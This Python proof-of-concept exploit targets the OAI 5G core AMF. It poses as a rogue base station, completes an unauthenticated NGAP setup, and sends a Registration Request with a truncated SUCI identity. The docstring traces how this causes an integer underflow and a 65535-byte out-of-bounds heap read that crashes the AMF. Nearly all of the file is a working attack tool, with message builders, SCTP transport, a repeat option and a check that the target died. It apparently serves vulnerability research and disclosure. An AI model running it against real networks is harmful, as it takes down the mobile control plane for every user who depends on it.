#!/usr/bin/env python3
"""PoC: OAI CN5G AMF — Pre-Auth Out-of-Bounds Heap Read via Truncated SUCI
(CWE-125) delivered by a rogue gNB over NGAP/SCTP (5GMM Registration Request).

Sibling of ``oai_auth_overflow_poc.py`` (VUL-20260912): both are rogue-gNB NGAP
injectors that kill an OAI NF pre-authentication with a single crafted NAS
message and no radio-side authentication. They differ in the sink and in the
memory-safety class:

  VUL-20260912  AUSF  CWE-121 stack overflow   oversized RES*  -> hex_str_to_uint8
  VUL-20260915  AMF   CWE-125 OOB heap read    truncated SUCI  -> blk2bstr memcpy   (this file)

This one needs NO provisioned subscriber, NO security context and NO
authentication round: the AMF dies while decoding the very first Registration
Request, before it ever talks to the UDM/AUSF.

Root cause (all paths relative to sources/oai-cn5g-amf)
-------------------------------------------------------
``RegistrationRequest::Decode`` parses the 5GS mobile identity IE FIRST
(``is_iei == false``, ``RegistrationRequest.cpp:834-838``) through
``Type6NasIe::Decode`` -> ``Validate`` which enforces ONLY an upper bound
(``len < GetHeaderLength() + li_``), so the declared IE length ``ie_len`` may be
0..7 with no minimum. ``_5gsMobileIdentity::DecodeSuci`` then walks a FIXED
8-octet IMSI layout (SUPI format, MCC/MNC, routing indicator, protection
scheme, home-network-pki) regardless of ``ie_len``, and at
``_5gsMobileIdentity.cpp:424``::

    int scheme_output_length = ie_len - decoded_size;   // 7 - 8 == -1  (UNDERFLOW)

``decode_bstring`` (``TLVDecoder.c:16-31``) takes the two lengths as UNSIGNED::

    int decode_bstring(bstring* bstr, const uint16_t pdulen,
                       const uint8_t* const buffer, const uint32_t buflen)
    if (buflen < pdulen) return TLV_BUFFER_TOO_SHORT;   // the ONLY guard

so -1 becomes ``pdulen = 65535`` and ``buflen = 4294967295``; the guard
``4294967295 < 65535`` is FALSE and ``blk2bstr`` (``bstrlib.c:286-310``) does a
raw ``memcpy(b->data, blk, 65535)`` — a 65535-byte read starting just past a
~26-byte heap buffer -> CWE-125 out-of-bounds read -> SIGSEGV, AMF process dies.

Boundary: ``ie_len == 8`` is the first SAFE value (scheme_output_length == 0, so
``blk2bstr`` copies nothing). Every ``ie_len`` in 0..7 underflows. open5GS guards
the identical SUCI parse with explicit ``SUCI_MIN_SIZE + 1`` minimum-length
checks; OAI does not.

Attack path (rogue gNB, no RAN authentication)
----------------------------------------------
    attacker gNB ──SCTP/NGAP──▶ oai-amf  (NGSetup accepted, no auth)
      └─ InitialUEMessage : NAS Registration Request
             5GS mobile identity IE declares ie_len=7 octets of SUCI
                ▼ AMF NAS decoder: DecodeSuci walks a FIXED 8 octets
             scheme_output_length = ie_len - decoded_size = 7 - 8 = -1
                ▼ decode_bstring(uint16 pdulen=65535, uint32 buflen=4294967295)
             guard 'buflen < pdulen' is FALSE -> blk2bstr memcpy 65535 bytes
                ▼ 65535-byte read past a ~26-byte heap buffer -> SIGSEGV, AMF dies

Impact: AMF process killed (DoS of the whole NGAP/NAS control plane) from a
single unauthenticated NAS message — no SIM, no subscriber, no authentication.

Flow: NGSetup → InitialUEMessage(Registration Request, truncated SUCI) → watch
for a downlink NAS response (AMF alive) or SCTP association loss (AMF dead).

Usage:
  python3 suci_oob_poc.py --host <AMF_NGAP_IP> --port 38412
  python3 suci_oob_poc.py --host <AMF_NGAP_IP> --ielen 7      # crash (default)
  python3 suci_oob_poc.py --host <AMF_NGAP_IP> --ielen 8      # SAFE control
  python3 suci_oob_poc.py --dry --ielen 7                     # print bytes, no network

Environment / defaults match the reference deployment (PLMN 208-95, TAC 0x00a000,
S-NSSAI SST=222/SD=00007b). Discover the AMF NGAP IP:
  docker inspect oai-amf --format '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}'

Requires: python3 + pysctp (``pip install pysctp``) + pycrate (``pip install
pycrate``). NGAP encoding via pycrate is byte-identical to the free5gc Go library
this PoC was ported from (verified against ``go/suci_oob_main.go --dry``).
"""
import argparse
import errno
import select
import socket
import sys
import time

try:
    import sctp  # pysctp
except ImportError:
    sys.exit("[-] pysctp is required: pip install pysctp")

try:
    from pycrate_asn1dir import NGAP
except ImportError:
    sys.exit("[-] pycrate is required: pip install pycrate")

# Single shared NGAP PDU codec object (pycrate keeps state in set_val/from_aper).
PDU = NGAP.NGAP_PDU_Descriptions.NGAP_PDU

# ---- protocol constants -------------------------------------------------
NGAP_PPID = 60                    # NGAP PPID (TS 38.412)
# SCTP carries the PPID in network byte order, but pysctp passes sinfo_ppid to
# the kernel verbatim (host order) and returns it un-swapped on recv. The
# free5gc Go wrapper byte-swaps internally, so the Python port must do it here
# or the AMF rejects every DATA chunk with "unsolicited PPID" and never replies.
NGAP_PPID_NET = socket.htonl(NGAP_PPID)

# NGAP procedure codes
PROC_DOWNLINK_NAS_TRANSPORT = 4
PROC_INITIAL_UE_MESSAGE = 15
PROC_NG_SETUP = 21

# NGAP ProtocolIE-IDs
IE_AMF_UE_NGAP_ID = 10
IE_GLOBAL_RAN_NODE_ID = 27
IE_NAS_PDU = 38
IE_RAN_UE_NGAP_ID = 85
IE_RRC_ESTABLISHMENT_CAUSE = 90
IE_SUPPORTED_TA_LIST = 102
IE_USER_LOCATION_INFORMATION = 121
IE_DEFAULT_PAGING_DRX = 21

# 5GMM NAS message types (TS 24.501)
NAS_REGISTRATION_REJECT = 0x44
NAS_AUTHENTICATION_REQUEST = 0x56

# Sentinel returned by read_msg when the SCTP association is torn down (peer died).
_ASSOC_LOST = object()

# DecodeSuci's fixed IMSI walk consumes exactly this many octets regardless of
# the declared IE length -- the source of the ie_len - decoded_size underflow.
SUCI_FIXED_WALK = 8


# =========================================================================
# NAS builders (TS 24.501, plain / non-security-protected) — mirror suci_oob_main.go
# =========================================================================
def plmn_bcd(mcc, mnc):
    """Encode MCC/MNC in the NAS/TS 24.008 octet order (also used inside a SUCI)."""
    b = bytearray(3)
    b[0] = ((ord(mcc[1]) - 48) << 4) | (ord(mcc[0]) - 48)
    if len(mnc) == 2:
        b[1] = 0xf0 | (ord(mcc[2]) - 48)
        b[2] = ((ord(mnc[1]) - 48) << 4) | (ord(mnc[0]) - 48)
    else:
        b[1] = ((ord(mnc[2]) - 48) << 4) | (ord(mcc[2]) - 48)
        b[2] = ((ord(mnc[1]) - 48) << 4) | (ord(mnc[0]) - 48)
    return bytes(b)


def truncated_suci_ie(mcc, mnc, ie_len, scheme):
    """Build the 5GS mobile identity IE *content* for a SUCI whose declared
    length is ``ie_len``. The full IMSI layout OAI reads is::

        [0]   SUPI format (bits 6-4) | type of identity (bits 3-1)
        [1-3] MCC/MNC (BCD)
        [4-5] routing indicator
        [6]   protection scheme id
        [7]   home network public key identifier
        [8-]  scheme output / MSIN

    Only the first ``ie_len`` octets are emitted, so the IE declares fewer bytes
    than DecodeSuci's fixed 8-octet walk consumes -> ie_len - decoded_size < 0.
    """
    full = bytearray([0x01])            # SUPI format = IMSI (0b000), type of identity = SUCI (0b001)
    full += plmn_bcd(mcc, mnc)          # 3 octets
    full += bytes([0x00, 0x00])         # routing indicator
    full.append(scheme & 0xff)          # protection scheme id -- MUST be non-zero
    if len(full) < ie_len:
        # pad so a larger ie_len can still be exercised (ie_len >= 8 is the safe
        # control case; pad with home-network-pki + MSIN digits)
        full.append(0x00)               # home network public key identifier
        while len(full) < ie_len:
            full.append(0x10)           # MSIN digit pair
    return bytes(full[:ie_len])


def build_registration_request(mcc, mnc, ie_len, scheme, sst, sd, trailer=True):
    """Build a plain-NAS 5GMM Registration Request whose 5GS mobile identity IE
    declares ``ie_len`` octets of SUCI content::

        7e 00 41 79 | <ie_len:2> <SUCI content ie_len B> | 2e 04 f0f0f0f0 | 2f 05 04 <sst> <sd>

    OAI decodes the 5GS mobile identity as a Type 6 IE with a 2-octet length and
    WITHOUT the spec's 0x77 IEI octet (is_iei == false at RegistrationRequest.cpp:835).
    The trailing UE security capability / requested NSSAI IEs keep ``len -
    decoded_size`` large so buf[6]/buf[7] stay attacker-controlled in-bounds
    reads, which is what makes the underflow deterministic.
    """
    nas = bytearray([0x7e, 0x00, 0x41])     # EPD 5GMM, plain NAS sec header, Registration Request
    nas.append(0x79)                        # ngKSI (high nibble) + registration type (low nibble)
    mid = truncated_suci_ie(mcc, mnc, ie_len, scheme)
    nas += bytes([(ie_len >> 8) & 0xff, ie_len & 0xff])
    nas += mid
    if trailer:
        nas += bytes([0x2e, 0x04, 0xf0, 0xf0, 0xf0, 0xf0])   # UE security capability (IEI 0x2e)
        sd_b = bytes.fromhex(sd)                              # Requested NSSAI (IEI 0x2f)
        nas += bytes([0x2f, 0x05, 0x04, sst & 0xff, sd_b[0], sd_b[1], sd_b[2]])
    return bytes(nas)


# =========================================================================
# NGAP builders (pycrate APER) — byte-identical to free5gc ngap.Encoder
# =========================================================================
def build_ngsetup_request(mcc, mnc, tac, gnb_id, sst, sd):
    plmn = plmn_bcd(mcc, mnc)
    tac_bytes = bytes.fromhex("%06x" % tac)
    snssai = {"sST": bytes([sst & 0xff])}
    if sd:
        snssai["sD"] = bytes.fromhex(sd)
    val = ("initiatingMessage", {
        "procedureCode": PROC_NG_SETUP,
        "criticality": "reject",
        "value": ("NGSetupRequest", {"protocolIEs": [
            {"id": IE_GLOBAL_RAN_NODE_ID, "criticality": "reject",
             "value": ("GlobalRANNodeID", ("globalGNB-ID", {
                 "pLMNIdentity": plmn,
                 "gNB-ID": ("gNB-ID", (gnb_id, 32))}))},
            {"id": IE_SUPPORTED_TA_LIST, "criticality": "reject",
             "value": ("SupportedTAList", [{
                 "tAC": tac_bytes,
                 "broadcastPLMNList": [{
                     "pLMNIdentity": plmn,
                     "tAISliceSupportList": [{"s-NSSAI": snssai}],
                 }],
             }])},
            {"id": IE_DEFAULT_PAGING_DRX, "criticality": "ignore",
             "value": ("PagingDRX", "v32")},
        ]})})
    PDU.set_val(val)
    return PDU.to_aper()


def build_initial_ue_message(mcc, mnc, tac, ran_ue_ngap_id, nas_pdu):
    plmn = plmn_bcd(mcc, mnc)
    tac_bytes = bytes.fromhex("%06x" % tac)
    val = ("initiatingMessage", {
        "procedureCode": PROC_INITIAL_UE_MESSAGE,
        "criticality": "ignore",
        "value": ("InitialUEMessage", {"protocolIEs": [
            {"id": IE_RAN_UE_NGAP_ID, "criticality": "reject",
             "value": ("RAN-UE-NGAP-ID", ran_ue_ngap_id)},
            {"id": IE_NAS_PDU, "criticality": "reject",
             "value": ("NAS-PDU", nas_pdu)},
            {"id": IE_USER_LOCATION_INFORMATION, "criticality": "reject",
             "value": ("UserLocationInformation", ("userLocationInformationNR", {
                 "nR-CGI": {"pLMNIdentity": plmn, "nRCellIdentity": (16, 36)},
                 "tAI": {"pLMNIdentity": plmn, "tAC": tac_bytes}}))},
            {"id": IE_RRC_ESTABLISHMENT_CAUSE, "criticality": "ignore",
             "value": ("RRCEstablishmentCause", "mo-Signalling")},
        ]})})
    PDU.set_val(val)
    return PDU.to_aper()


# =========================================================================
# NGAP / NAS decode helpers
# =========================================================================
def is_successful_outcome(raw):
    """True if the NGAP PDU is a successfulOutcome (e.g. NGSetupResponse)."""
    try:
        PDU.from_aper(raw)
        return PDU.get_val()[0] == "successfulOutcome"
    except Exception:
        return False


def parse_downlink_nas(raw):
    """Return (amf_ue_ngap_id, nas_pdu) from a DownlinkNASTransport, else None."""
    try:
        PDU.from_aper(raw)
    except Exception:
        return None
    v = PDU.get_val()
    if v[0] != "initiatingMessage":
        return None
    im = v[1]
    if im["procedureCode"] != PROC_DOWNLINK_NAS_TRANSPORT:
        return None
    _name, content = im["value"]
    amf_id, nas = None, None
    for ie in content["protocolIEs"]:
        if ie["id"] == IE_AMF_UE_NGAP_ID:
            amf_id = ie["value"][1]
        elif ie["id"] == IE_NAS_PDU:
            nas = ie["value"][1]
    return amf_id, nas


def nas_type_of(b):
    """Return the 5GMM message type of a (possibly security-protected) NAS PDU."""
    if not b or len(b) < 3 or b[0] != 0x7e:
        return None
    sh = b[1] & 0x0f
    if sh == 0:                             # plain NAS
        return b[2]
    inner = b[7:]                           # protected: inner msg after 7-byte header
    if len(inner) >= 3 and inner[0] == 0x7e:
        return inner[2]
    return None


# =========================================================================
# SCTP transport (pysctp one-to-one, TCP-style) with PPID=60
# =========================================================================
def dial(host, port):
    """Open an SCTP association to the AMF NGAP endpoint. Returns (sock, fd)."""
    sock = sctp.sctpsocket_tcp(socket.AF_INET)
    sock.events.data_io = True              # subscribe to SndRcvInfo (to read PPID)
    sock._set_initparams({"_num_ostreams": 5, "_max_instreams": 5,
                          "_max_attempts": 4, "_max_init_timeo": 8})
    sock.settimeout(5.0)                    # connect timeout
    try:
        sock.connect((host, port))
    except socket.error as e:
        sys.exit(f"[-] SCTP connect to {host}:{port} failed: {e}")
    sock.settimeout(None)                   # blocking; reads driven by select()
    return sock, sock.fileno()


def send_msg(sock, data):
    sock.sctp_send(data, ppid=NGAP_PPID_NET)


def read_msg(sock, fd, timeout):
    """Read one NGAP (PPID=60) SCTP message within ``timeout`` seconds.

    Returns the message bytes on success, ``None`` on timeout, or ``_ASSOC_LOST``
    if the association was torn down (the peer process died -> SIGSEGV).
    """
    deadline = time.time() + timeout
    while True:
        remaining = deadline - time.time()
        if remaining <= 0:
            return None
        r, _, _ = select.select([fd], [], [], min(remaining, 0.5))
        if not r:
            continue
        try:
            _fromaddr, _flags, msg, notif = sock.sctp_recv(65536)
        except (BlockingIOError, OSError) as e:
            if getattr(e, "errno", None) in (errno.EAGAIN, errno.EINTR):
                continue
            return _ASSOC_LOST              # ECONNRESET / EPIPE / etc: peer gone
        if not msg:
            return _ASSOC_LOST              # empty read => association torn down
        ppid = getattr(notif, "ppid", None)
        if ppid is not None and ppid not in (NGAP_PPID, NGAP_PPID_NET):
            continue                        # skip non-NGAP PPIDs (either byte order)
        return msg


# =========================================================================
# main — mirrors the Go PoC's rogue-gNB flow (NGSetup -> InitialUEMessage[s])
# =========================================================================
def main():
    ap = argparse.ArgumentParser(
        description="OAI CN5G AMF pre-auth OOB heap read via truncated SUCI (rogue gNB NGAP).")
    ap.add_argument("--host", default="172.30.0.7", help="AMF NGAP IP (default: 172.30.0.7)")
    ap.add_argument("--port", type=int, default=38412, help="AMF NGAP SCTP port (default: 38412)")
    ap.add_argument("--mcc", default="208", help="PLMN MCC (default: 208)")
    ap.add_argument("--mnc", default="95", help="PLMN MNC (default: 95)")
    ap.add_argument("--tac", type=lambda x: int(x, 0), default=0xa000,
                    help="TAC matching AMF plmn_support_list (default: 0xa000)")
    ap.add_argument("--sst", type=lambda x: int(x, 0), default=222, help="S-NSSAI SST (default: 222)")
    ap.add_argument("--sd", default="00007b", help="S-NSSAI SD, hex (default: 00007b)")
    ap.add_argument("--gnbid", type=lambda x: int(x, 0), default=0x0abeef,
                    help="rogue gNB ID (default: 0x0abeef)")
    ap.add_argument("--ielen", type=int, default=7,
                    help="declared 5GS mobile identity IE length; 0..7 underflows, 8 is the first SAFE value (default: 7)")
    ap.add_argument("--scheme", type=lambda x: int(x, 0), default=1,
                    help="protection scheme id octet at SUCI content[6]; must be non-zero (default: 1)")
    ap.add_argument("--no-trailer", action="store_true",
                    help="omit the trailing UE security capability / requested NSSAI IEs")
    ap.add_argument("--dry", action="store_true",
                    help="print the crafted NAS PDU + InitialUEMessage hex and exit (no network)")
    ap.add_argument("--ranueid", type=int, default=1,
                    help="RAN UE NGAP ID of the first Registration Request (default: 1)")
    ap.add_argument("--repeat", type=int, default=1,
                    help="send this many crafted Registration Requests over ONE SCTP association (default: 1)")
    ap.add_argument("--delay", type=float, default=0.0,
                    help="delay in seconds between repeated Registration Requests (default: 0)")
    args = ap.parse_args()

    if args.scheme == 0:
        sys.exit("[-] --scheme must be non-zero (a null protection scheme takes the safe branch)")

    nas = build_registration_request(args.mcc, args.mnc, args.ielen, args.scheme,
                                     args.sst, args.sd, not args.no_trailer)

    print(f"[*] OAI AMF pre-auth OOB heap read (truncated SUCI) — rogue gNB NGAP injector")
    print(f"[*] crafted NAS Registration Request ({len(nas)} octets), declared SUCI IE length = {args.ielen}")
    print(f"[*] NAS hex: {nas.hex()}")
    underflow = args.ielen - SUCI_FIXED_WALK
    print(f"[*] DecodeSuci fixed walk consumes {SUCI_FIXED_WALK} octets -> "
          f"scheme_output_length = {args.ielen} - {SUCI_FIXED_WALK} = {underflow}")
    if args.ielen < SUCI_FIXED_WALK:
        pdulen = underflow & 0xffff
        buflen = underflow & 0xffffffff
        print(f"[*] as uint16_t pdulen = {pdulen}, as uint32_t buflen = {buflen} -> "
              f"decode_bstring guard 'buflen < pdulen' is FALSE")
        print(f"[*] blk2bstr will memcpy {pdulen} bytes from past the end of a "
              f"{len(nas)}-byte heap buffer")
    else:
        print(f"[*] SAFE control case: scheme_output_length >= 0, blk2bstr copies nothing")

    if args.dry:
        iue = build_initial_ue_message(args.mcc, args.mnc, args.tac, args.ranueid, nas)
        print(f"[*] InitialUEMessage hex ({len(iue)} octets): {iue.hex()}")
        return

    sock, fd = dial(args.host, args.port)
    print(f"[+] SCTP association to {args.host}:{args.port} established")
    try:
        # 1. NGSetup -- the AMF does not authenticate gNBs.
        ngsetup = build_ngsetup_request(args.mcc, args.mnc, args.tac,
                                        args.gnbid, args.sst, args.sd)
        send_msg(sock, ngsetup)
        resp = read_msg(sock, fd, 5.0)
        if resp is _ASSOC_LOST:
            sys.exit("[-] SCTP association lost before NGSetupResponse (AMF already down?)")
        if resp is None:
            sys.exit("[-] no NGSetupResponse (timeout) — check PLMN/TAC/NSSAI match the AMF config")
        if not is_successful_outcome(resp):
            sys.exit(f"[-] NGSetup rejected (PLMN/TAC/NSSAI mismatch?): {resp.hex()}")
        print(f"[+] NGSetup accepted (rogue gNB {args.gnbid:08x}, unauthenticated)")

        # 2. InitialUEMessage(s) carrying the truncated SUCI Registration Request.
        # One association is reused for all repeats so the AMF's per-gNB context
        # stays constant; the AMF should die on the very first crafted request.
        t0 = time.time()
        for n in range(args.repeat):
            ue_id = args.ranueid + n
            iue = build_initial_ue_message(args.mcc, args.mnc, args.tac, ue_id, nas)
            try:
                send_msg(sock, iue)
            except OSError as e:
                print(f"[!] send InitialUEMessage #{n + 1} failed after "
                      f"{time.time() - t0:.3f}s: {e}")
                print(f"[+] VERDICT: association lost after {n} request(s) -> AMF process died")
                return
            if n == 0:
                print(f"[+] InitialUEMessage sent: Registration Request with SUCI IE "
                      f"length={args.ielen}, protection scheme={args.scheme}")
            if n > 0 and args.delay > 0:
                time.sleep(args.delay)
            if (n + 1) % 500 == 0:
                print(f"[*] {n + 1}/{args.repeat} crafted Registration Requests sent "
                      f"({time.time() - t0:.0f}s elapsed)")
        print(f"[+] {args.repeat} crafted Registration Request(s) delivered in "
              f"{time.time() - t0:.3f}s")

        # 3. Observe the association: a dead AMF tears the SCTP association down.
        print("[*] watching for a downlink NAS response (AMF alive) or association loss (AMF dead)...")
        for _ in range(8):
            raw = read_msg(sock, fd, 2.0)
            if raw is None:
                continue                        # timeout -> keep watching
            if raw is _ASSOC_LOST:
                print(f"[!] SCTP read error after {time.time() - t0:.3f}s")
                print("[+] VERDICT: association lost -> AMF process died "
                      "(SIGSEGV in blk2bstr memcpy)")
                return
            dl = parse_downlink_nas(raw)
            if dl is not None:
                mt = nas_type_of(dl[1])
                label = {NAS_REGISTRATION_REJECT: "Registration Reject",
                         NAS_AUTHENTICATION_REQUEST: "Authentication Request"}.get(mt, f"type 0x{mt:02x}" if mt else "?")
                print(f"[*] AMF STILL ALIVE, downlink NAS ({label}): {raw.hex()}")
            else:
                print(f"[*] AMF STILL ALIVE, downlink NGAP ({len(raw)} octets): {raw.hex()}")
        print("[-] no association loss observed within the watch window; "
              "verify with: docker inspect oai-amf --format '{{.State.Status}} ExitCode={{.State.ExitCode}}'")
    finally:
        sock.close()


if __name__ == "__main__":
    main()
